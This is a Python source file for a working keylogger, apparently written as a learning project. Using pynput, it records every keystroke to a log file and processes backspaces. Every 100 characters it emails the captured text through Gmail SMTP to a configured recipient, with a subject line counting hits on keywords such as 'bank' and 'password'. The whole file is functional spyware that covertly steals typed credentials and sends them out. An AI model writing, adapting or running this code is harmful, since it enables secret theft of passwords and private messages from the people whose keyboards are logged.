#Derik Colucci

from pynput import keyboard
from email.message import EmailMessage
from dotenv import load_dotenv
import re, os, ssl, smtplib

keywords = ["bank", "instagram", "facebook", "twitter", "password", "email"]
finalLength = 0 #used for testing to ensure the size was what was intended
fileSize = 0 #used to track the char size to terminate and email the contents at a specific point
maxFileSize = 100 #when to stop the file and email the contents, will return less than intended characters if a backspace is involved in the input, 
#the program will read and apply the backspace and still add to the running total of characters, 100 for fast testing, a keylogger would probably want to store a lot more inputs
temp = "" #temp variable to store the contents of the email before sending

def keyLogs(runningLog):
    with open("logfile.txt", 'a') as keylog:
        keylog.write(runningLog)
    
def readKeylog():
    with open("logfile.txt", 'r') as logReader:
        inputFile = logReader.read()
    return findBackspaces(inputFile)

def editKeylog(inputFile):
    with open("logfile.txt", 'w') as logEditor:
        logEditor.write(inputFile)

def clearFile():
    with open("logfile.txt", 'w') as logClear:
        logClear.truncate(0) #clear the contents of the file
        runningLog = ""
        temp = ""

def keyPressed(key):    
    runningLog = ""  # initializing the string for the user input
    global fileSize, maxFileSize, temp
    try:    
        if hasattr(key, 'char') and key.char is not None:  # used to make sure the key is entered and is a char
            runningLog += key.char
        elif key == keyboard.Key.space:  # used for easier reading in output file
            runningLog += " "
        elif key == keyboard.Key.backspace:  # handle backspace
            runningLog += "{<Key.backspace: <8>>}"  # representing the backspace key as a string
        elif key == keyboard.Key.enter: #creates the action of enter instead of a key representation
            runningLog += "\n"
        elif key == keyboard.Key.shift_l or key == keyboard.Key.shift_r: #used to remove visual clutter from the output file
            runningLog += ""
        else:
            runningLog += f"[{key}]" #for any key that might have been missed in the code above

        keyLogs(runningLog)  # call the function for each key press
        processKeylog()  # process the log file after each key press

        if runningLog != "{<Key.backspace: <8>>}": #ignores the backspaces
            fileSize += 1

        if fileSize == maxFileSize:
            with open("logfile.txt", 'r') as emailFile:
                temp = emailFile.read()
            #print(f"{temp}") #terminal tester to avoid sending x amount of emails(uncomment terminal testers)
            emailData() #send the email
            fileSize = 0 #reset the counter
            clearFile() #delete contents of file once it has been sent(terminal tester)     
            
    except Exception as error:
        print(f"Error: {error}")


def findBackspaces(inputFile):
    processedData = []  # new list to store and change contents of string
    i = 0
    while(i < len(inputFile)):  # looping through the input file
        if(inputFile[i:i+22] == "{<Key.backspace: <8>>}" and processedData):  # checking for backspaces
            processedData.pop()  # remove the previous letter to simulate backspace
            i += 22  # skip the backspace representation
        else:
            processedData.append(inputFile[i])  # add the character to the list
            i += 1

    editedData = ''.join(processedData)  # convert list back to string
    return editedData  # return the backspaced string

def processKeylog():
    try:
        finalString = readKeylog()  # read the input file and process
        if finalString:  # check if finalString has any contents
            editKeylog(finalString)  # rewrite the file with backspace handling
        else:
            print("Error processing file.")
    except FileNotFoundError:
        print("Could not find the input file to process.")
    except IOError:
        print("Could not open process file for reading and writing.")

def emailData():
    global temp, counter
    load_dotenv() #loads the variables into the program
    #for simple testing comment out the variables above and uncomment variables below
    #emailSend = ""
    #emailPassword = ""
    #emailReceive = ""
    #access the variables from the env file, use to avoid displaying information
    emailSend = os.environ.get('email')
    emailPassword = os.environ.get('password')
    emailReceive = os.environ.get('sendto')
    #print(emailSend) #comfirm sender email
    #print(emailPassword) #confrim sender password
    #print(emailReceive) #confirm recipient
    subject = f"Number of keywords: {keyWordSearch()}"
    body = temp
    #create the email object and fill the object with contents
    email = EmailMessage()
    email['From'] = emailSend
    email['To'] = emailReceive
    email['Subject'] = subject
    email.set_content(body)

    security = ssl.create_default_context() #used to add a layer of security when sending the email, need for the creation of the email, using ssl for current simplicity instead of tls
    with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=security) as smtp: #default gmail host sever and port for sending emails
        smtp.login(emailSend, emailPassword) #login to the email
        smtp.sendmail(emailSend, emailReceive, email.as_string()) #use sender email, pick recipient, and add the contents as a string to send

    clearFile() #delete contents of file once it has been sent

def keyWordSearch() -> int: #keyword counting function for subject line of email
    global keywords
    counter = 0
    with open("logfile.txt", 'r') as file:
        content = file.read()
    for keyword in keywords:
        if re.search(keyword, content, re.IGNORECASE): #search the contents of the file for keywords, non case sensitive
            counter += 1
    return counter
    


if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    listener.join()
    input()  # keep the program running
